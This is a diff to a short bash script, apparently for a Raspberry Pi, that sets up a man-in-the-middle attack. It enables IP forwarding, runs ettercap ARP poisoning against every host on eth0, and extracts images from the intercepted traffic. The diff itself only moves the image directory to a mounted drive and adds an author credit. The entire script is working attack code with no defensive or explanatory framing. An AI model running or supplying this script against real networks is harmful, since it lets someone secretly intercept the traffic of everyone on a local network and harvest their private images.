@@ -1,7 +1,7 @@
 #!/bin/bash
 echo "$(tput bold)$(tput setaf 1)MITM initialize / enable port forwarding & make directory for files$(tput sgr0)"
-sudo mkdir localImages
-gif=$(find /home/pi/localImages/ -type f -name "*.gif")
+sudo mkdir /mnt/localImages # create directory on mount HDD. me no like flash drive write cycles :'(
+gif=$(find /mnt/localImages/ -type f -name "*.gif")
 sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding for arp poisoning
 sudo ettercap -T -Q -M arp -i eth0 // // &
 echo "$(tput bold)$(tput setaf 1)extract images -x myImages & save$(tput sgr0)"
@@ -11,7 +11,8 @@ do
 if [[ ( -n $gif ) ]]
 then
         echo "$(tput bold)$(tput setaf 1)delete all gifs$(tput sgr0)"
-        sudo rm /home/pi/localImages/*.gif
+        sudo rm /mnt/localImages/*.gif
 fi
 done
 # end program
+# Daniel Jay Bertner 2014
